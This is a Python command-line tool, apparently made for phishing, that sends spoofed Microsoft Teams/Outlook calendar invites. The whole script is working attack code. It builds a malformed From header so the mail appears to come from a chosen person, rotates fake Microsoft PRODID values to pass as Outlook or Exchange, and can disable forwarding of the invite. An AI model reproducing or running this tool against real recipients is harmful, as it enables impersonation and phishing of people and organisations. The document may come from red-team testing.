from datetime import datetime, timedelta, timezone
from uuid import uuid4
import argparse
import logging
import os
import pytz
import random
import re
import smtplib
import string
import sys

full_timezone_names = {
    "EST": "Eastern Standard Time",
    "EDT": "Eastern Daylight Time",
    "CST": "Central Standard Time",
    "CDT": "Central Daylight Time",
    "PST": "Pacific Standard Time",
    "PDT": "Pacific Daylight Time",
    "MST": "Mountain Standard Time",
    "MDT": "Mountain Daylight Time",
}

microsoft_prodids = [
    "Microsoft Exchange Server 2010",
    "Microsoft Exchange Server 2013", 
    "Microsoft Exchange Server 2016",
    "Microsoft Exchange Server 2019",
    "Microsoft Exchange Server",
    "-//Microsoft Corporation//Outlook 12.0 MIMEDIR//EN",
    "-//Microsoft Corporation//Outlook 14.0 MIMEDIR//EN", 
    "-//Microsoft Corporation//Outlook 15.0 MIMEDIR//EN",
    "-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN",
    "-//Microsoft Corporation//Outlook for Mac MIMEDIR//EN",
    "-//Microsoft Corporation//Outlook MIMEDIR//EN",
    "-//Microsoft Corporation//CDO for Exchange 2000//EN",
    "-//Microsoft Corporation//CDO for Windows 2000//EN",
    "Microsoft Office Outlook 12.0",
    "Microsoft Office Outlook 14.0", 
    "Microsoft Office Outlook 15.0",
    "Microsoft Office Outlook 16.0",
    "-//Microsoft//EN",
    "Microsoft Outlook 15.0",
    "Microsoft Outlook 16.0", 
    "Microsoft Exchange Calendar Agent",
    "-//Microsoft Corporation//CalDAV Client//EN",
    "-//Microsoft Corporation//Exchange Server//EN"
]

parser = argparse.ArgumentParser(
    description="Sends phishing emails with 'on behalf of' with calender invites"
)

# Required arguments
parser.add_argument('--from', metavar='', dest='from_addr', help='Actual from email address', required=True)
parser.add_argument('--spoof-from-name', metavar='', dest='from_name', help='CN for "from" user', required=True)
parser.add_argument('--spoof-from',metavar='',dest='spoof_from', help='On behalf of email', required=True)
parser.add_argument('--subject', metavar='', help='Email subject', required=True)
parser.add_argument('--target-cn', metavar='', dest='target_cn', help='Target CN (rcpt)', required=True)
parser.add_argument('--target', metavar='', help='Target email (rcpt)', required=True)
parser.add_argument('--tz', metavar='', help='Timezone for meeting', required=True)

parser.add_argument('--body', metavar='', dest='body', help='Body of the email', required=False)
parser.add_argument('--disable-forwarding', metavar='', dest='disable_forwarding', default=False, help='Disable forwarding of the event: <True/False>', required=False)
parser.add_argument('--meeting-begin', metavar='', dest='meeting_begin', help='Begin time for Teams meeting', required=False)
parser.add_argument('--meeting-end', metavar='', dest='meeting_end', help='End time for Teams meeting', required=False)
parser.add_argument('--meeting-summary', metavar='', dest='meeting_summary', help='The summary (title) for the meeting', required=False)
parser.add_argument('--password',metavar='',help='SMTP Password, , will also check env variable SMTP_PASSWORD', required=False)
parser.add_argument('--priority', metavar='', type=int, default=5, help='Priority of the event (1-5)', required=False)
parser.add_argument('--prodid', metavar='', help='Calendar PRODID field', required=False)
parser.add_argument('--url', metavar='', help='SMTP server:port, , will also check env variable SMTP_SERVER', required=False)
parser.add_argument('--user',metavar='',help='SMTP Username, will also check env variable SMTP_USER', required=False)
parser.add_argument('--debug', help='Enable debug, print message prior to sending', action='store_true', required=False)
parser.add_argument('--dryrun', help='Disable sending of message', action='store_true', required=False)

args = parser.parse_args()

if args.dryrun:
    args.debug = True

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Input validation
def validate_email(email):
    """Basic email validation"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def validate_datetime_format(dt_string):
    """Validate datetime format"""
    try:
        datetime.strptime(dt_string, '%Y%m%dT%H%M%S')
        return True
    except ValueError:
        return False

if not validate_email(args.from_addr):
    logger.error("Invalid from address format")
    sys.exit(1)

if not validate_email(args.target):
    logger.error("Invalid target address format")
    sys.exit(1)

if not validate_email(args.spoof_from):
    logger.error("Invalid spoof from address format")
    sys.exit(1)

if args.meeting_begin and not validate_datetime_format(args.meeting_begin):
    logger.error("Invalid meeting begin time format. Use YYYYMMDDTHHMMSS")
    sys.exit(1)

if args.meeting_end and not validate_datetime_format(args.meeting_end):
    logger.error("Invalid meeting end time format. Use YYYYMMDDTHHMMSS")
    sys.exit(1)

# SMTP server parsing and validation
def parse_smtp_server(smtp_server):
    """Parse and validate SMTP server configuration"""
    if not smtp_server:
        logger.error("SMTP server not provided")
        sys.exit(1)
    
    parts = smtp_server.split(":")
    if len(parts) != 2:
        logger.error("SMTP server must be in format 'host:port'")
        sys.exit(1)
    
    try:
        port = int(parts[1])
        if not (1 <= port <= 65535):
            raise ValueError("Port out of range")
    except ValueError:
        logger.error("Invalid port number")
        sys.exit(1)
    
    return parts[0], port

smtp_server = args.url if args.url else os.environ.get("SMTP_SERVER")
if not smtp_server:
    logger.error("SMTP server must be provided via --url or SMTP_SERVER environment variable")
    sys.exit(1)

url, port = parse_smtp_server(smtp_server)
user = args.user if args.user else os.environ.get("SMTP_USER")
password = args.password if args.password else os.environ.get("SMTP_PASSWORD")

if not user or not password:
    logger.error("SMTP credentials must be provided")
    sys.exit(1)

meeting_begin = args.meeting_begin if args.meeting_begin else (datetime.now() + timedelta(minutes=15)).strftime('%Y%m%dT%H%M%S')
meeting_end = args.meeting_end if args.meeting_end else (datetime.now() + timedelta(minutes=45)).strftime('%Y%m%dT%H%M%S')
meeting_summary = args.meeting_summary if args.meeting_summary else args.subject
body = args.body if args.body else f"<p>Dear {args.target_cn},</p><p>You are invited to a meeting.</p><p>Best regards,</p><p>{args.from_name}</p>"
timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
timezone = pytz.timezone(args.tz)
current_time = datetime.now(timezone)
utc_offset = current_time.utcoffset()
formatted_offset = f"{utc_offset.total_seconds() // 3600:+03.0f}{abs(utc_offset.seconds // 60 % 60):02}"
is_dst = bool(current_time.dst())
boundary = str(uuid4())
selected_prodid = args.prodid if args.prodid else random.choice(microsoft_prodids)
chars = string.ascii_letters + string.digits

if args.debug:
    print(f"""
Sending from: {args.from_addr}
Spoofing from: {args.from_name}
spoof_from: {args.spoof_from}
""")

message = f"""From: "{args.from_name} <{args.spoof_from}>;" <{args.from_addr}>
Subject:{args.subject}
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="{boundary}"
--{boundary}
Content-Transfer-Encoding: 7bit
Content-Type: text/html; charset="utf-8"

{body}

--{boundary}
Content-Type: text/calendar; charset="utf-8"; method=REQUEST
Content-Transfer-Encoding: 7bit

BEGIN:VCALENDAR
METHOD:REQUEST
PRODID:{selected_prodid}
VERSION:2.0
BEGIN:VTIMEZONE
TZID:{full_timezone_names[current_time.tzname()]}
BEGIN:STANDARD
DTSTART:16010101T020000
TZOFFSETFROM:{formatted_offset if is_dst else formatted_offset[:1] + str((int(formatted_offset[2]) - 1)) + formatted_offset[3:]}
TZOFFSETTO:{formatted_offset if not is_dst else formatted_offset[:1] + str((int(formatted_offset[2]) + 1)) + formatted_offset[3:]}
RRULE:FREQ=YEARLY;INTERVAL=1;BYDAY=1SU;BYMONTH=11
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:16010101T020000
TZOFFSETFROM:{formatted_offset if not is_dst else formatted_offset[:1] + str((int(formatted_offset[2]) + 1)) + formatted_offset[3:]}
TZOFFSETTO:{formatted_offset if is_dst else formatted_offset[:1] + str((int(formatted_offset[2]) - 1)) + formatted_offset[3:]}
RRULE:FREQ=YEARLY;INTERVAL=1;BYDAY=2SU;BYMONTH=3
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
ORGANIZER;CN="{args.from_name}":mailto:{args.spoof_from}
ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE;CN="{args.target_cn}":mailto:{args.target}
DESCRIPTION;LANGUAGE=en-US:{args.subject}
UID:{''.join(random.choices(chars, k=100)).upper()}RENDERBENDER
SUMMARY;LANGUAGE=en-US:{meeting_summary}
DTSTART;TZID={full_timezone_names[current_time.tzname()]}:{meeting_begin}
DTEND;TZID={full_timezone_names[current_time.tzname()]}:{meeting_end}
CLASS:PUBLIC
PRIORITY:{args.priority}
DTSTAMP:{timestamp}
TRANSP:OPAQUE
STATUS:CONFIRMED
SEQUENCE:0
X-MICROSOFT-DONOTFORWARDMEETING:{'TRUE' if args.disable_forwarding else 'FALSE'}
X-MICROSOFT-DISALLOW-COUNTER:FALSE
X-MICROSOFT-REQUESTEDATTENDANCEMODE:DEFAULT
X-MICROSOFT-ISRESPONSEREQUESTED:TRUE
BEGIN:VALARM
DESCRIPTION:REMINDER
TRIGGER;RELATED=START:-PT15M
ACTION:DISPLAY
END:VALARM
END:VEVENT
END:VCALENDAR

--{boundary}--"""

if args.debug:
    print(message)

if not args.dryrun:
    try:
        logger.info(f"Connecting to SMTP server {url}:{port}")
        with smtplib.SMTP_SSL(url, port) as server:
            server.login(user, password)
            server.sendmail(args.from_addr, args.target, message)
            logger.info("Email sent successfully")
    except smtplib.SMTPAuthenticationError:
        logger.error("SMTP authentication failed")
        sys.exit(1)
    except smtplib.SMTPException as e:
        logger.error(f"SMTP error: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)
